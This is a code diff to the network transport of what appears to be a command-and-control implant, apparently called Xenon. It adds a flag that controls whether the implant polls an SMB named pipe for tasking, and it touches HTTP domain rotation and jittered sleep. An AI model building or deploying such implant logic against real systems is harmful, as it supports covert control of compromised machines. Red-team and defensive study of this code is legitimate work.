@@ -31,7 +31,7 @@ BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);
  * 
  * @return BOOL
  */
-BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T* pOutLen)
+BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T* pOutLen, _In_ BOOL IsGetResponse)
 {
 /* HTTPX C2 Profile */
     #ifdef HTTPX_TRANSPORT
@@ -51,9 +51,9 @@ BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T*
         BOOL bStatus = FALSE; 
         
         /* Send data to named pipe */
-        bStatus = NetworkSmbSend(package, ppOutData, pOutLen);
+        bStatus = NetworkSmbSend(package, ppOutData, pOutLen, IsGetResponse);
         
-        if (bStatus == FALSE || ppOutData == NULL || pOutLen == NULL)
+        if ( bStatus == FALSE )
             return FALSE;
 
         return TRUE;
@@ -104,7 +104,7 @@ BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
     BOOL bStatus = TRUE;
 
 retry_request:
-    // Domain rotation strategy
+    /* Rotate domains if the HTTP request failed */
     StrategyRotate(bStatus, &gFailureCount);
 
     switch (reqProfile)
@@ -159,30 +159,40 @@ retry_request:
  * 
  * @return BOOL
  */
-BOOL NetworkSmbSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
+BOOL NetworkSmbSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen, BOOL IsGetResponse)
 {
     BOOL bStatus = FALSE;
 
     /* Create/Write data to SMB Comms Channel */
     bStatus = SmbSend(package);
     
-    /* Wait/Read data from SMB Comms Channel */
-    //bStatus = SmbRecieve(ppOutData, pOutLen);
-    do {
-        bStatus = SmbRecieve(ppOutData, pOutLen);
 
-        if ( bStatus )
-        {
-            if ( *ppOutData == NULL && *pOutLen == 0 ) {
-                SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
-            } else {
-                break;
+    /* Wait/Read data from SMB Comms Channel */
+
+    if ( IsGetResponse )
+    {
+        do {
+
+            bStatus = SmbRecieve(ppOutData, pOutLen);
+
+            if ( bStatus )
+            {
+                if ( *ppOutData == NULL && *pOutLen == 0 )
+                {
+                    SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+                } 
+                else 
+                {
+                    break;
+                }
             }
-        }
-    } while ( TRUE );
+
+        } while ( TRUE );
+    }
     
     return bStatus;
 }
+
 
 #endif  // SMB_TRANSPORT
 
